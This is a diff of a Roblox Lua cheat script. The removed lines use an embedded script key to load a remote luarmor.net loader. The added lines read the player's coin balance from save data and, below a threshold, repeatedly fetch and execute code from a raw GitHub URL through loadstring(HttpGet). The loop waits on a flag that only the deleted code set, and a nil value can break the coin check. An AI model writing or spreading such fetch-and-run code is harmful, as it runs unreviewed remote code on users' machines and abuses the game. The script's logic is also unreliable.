@@ -225,22 +225,39 @@ end)
 
 
 
+local save
+
+repeat
+	wait(1)
+	pcall(function()
+		save = game:GetService("ReplicatedStorage").Library.Client.Save
+	end)
+
+until save
+
+save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 
 
-
-task.spawn(function()
-wait(30)
-if game.PlaceId ~= 19006211286 then
-script_key="XAdjDGBFdnbHGZdFSqaweDWenvpbEFRP";
-
-daubuoi = true
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b58d9c50c5ea74f255af40a8f735773.lua"))()
-end
-end)
+local ttcoin = nil
 
 
-if game.PlaceId == 19006211286 then
+		for i, v in pairs(save.Inventory.Currency) do
+            if v.id == 'Coins' then
+				ttcoin = v._am or 1				
+			end
+		end
+if ttcoin < 50000 then
+		
+	repeat
+	wait()
+		task.spawn(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/bomayso/ram/refs/heads/main/petg0nomail"))()
+		end)
+	wait(3)
+	until daubuoi
+
+
+elseif game.PlaceId == 19006211286 then
 
 
 task.spawn(function()
